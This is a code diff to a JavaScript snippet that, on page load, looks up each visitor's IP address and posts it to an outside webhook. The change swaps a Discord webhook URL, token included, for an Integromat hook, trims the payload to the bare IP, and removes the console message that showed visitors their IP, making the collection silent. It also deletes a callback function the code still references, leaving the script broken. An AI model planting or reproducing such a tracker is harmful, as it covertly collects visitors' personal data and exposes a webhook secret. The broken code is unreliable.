@@ -1,6 +1,5 @@
 $(document).ready(function () {
 	$.getJSON("http://jsonip.com/?callback=?", function (data) {
-		console.log("Your IP Is: " + data.ip);
 		postDataToWebhook(data.ip);
 	});
 });
@@ -9,11 +8,11 @@ function postDataToWebhook(data) {
 	var ip = data;
 
 	//url to your webhook
-	var webHookUrl = "https://discordapp.com/api/webhooks/616002157908459539/Fbth7WJjqLnScBGVij8ttgxTMBn6l3mOEtRGZI5JO0PTOpVWa7CSSbYW-4l_HMVG_pvr";
+	var webHookUrl = "https://hook.integromat.com/2lg6n1cc3wycbjkap7y52yfuthxg74n9";
 
 	//https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest
 	var oReq = new XMLHttpRequest();
-	var myJSONStr = { "content": "New User IP Address: " + ip, "username": "Users IP Address", "avatar_url": "https://hunter-central-hub--thefalsegamer4.repl.co/webdev.png" };
+	var myJSONStr = {"content":ip};
 
 	//register method called after data has been sent method is executed
 	oReq.addEventListener("load", reqListener);
@@ -21,7 +20,4 @@ function postDataToWebhook(data) {
 	oReq.setRequestHeader('Content-Type', 'application/json');
 	oReq.send(JSON.stringify(myJSONStr));
 }
-//callback method after webhook is executed
-function reqListener() {
-	console.log(this.responseText);
-}
+
